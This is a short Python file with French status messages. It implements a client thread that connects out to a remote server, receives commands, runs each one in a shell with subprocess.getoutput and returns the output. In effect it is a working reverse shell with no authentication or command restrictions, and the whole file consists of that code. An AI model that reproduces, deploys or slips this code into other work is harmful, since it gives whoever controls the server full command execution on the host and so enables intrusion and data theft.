import socket
import subprocess
import threading


class ClientThread(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.sock = None
        self.running = True

    def run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[+] Connecté au serveur {self.host}:{self.port}")

            while self.running:
                command = self.sock.recv(1024)
                if not command:
                    print("[*] Connexion fermée par le serveur.")
                    break

                command = command.decode()

                if command.lower() == "exit":
                    print("[*] Commande de déconnexion reçue, fermeture client.")
                    self.running = False
                    break

                if command.startswith("msg "):
                    message = command[4:]
                    print(f"[MESSAGE DU SERVEUR] {message}")
                    self.sock.send("[OK] Message affiché".encode())
                    continue

                output = self.execute_command(command)
                self.sock.send(output.encode())

        except Exception as e:
            print(f"[!] Erreur : {e}")
        finally:
            if self.sock:
                self.sock.close()
            print("[*] Connexion fermée.")

    def execute_command(self, command):
        try:
            result = subprocess.getoutput(command)
            return result if result else "[*] Commande exécutée sans sortie."
        except Exception as e:
            return f"[!] Erreur d'exécution : {str(e)}"
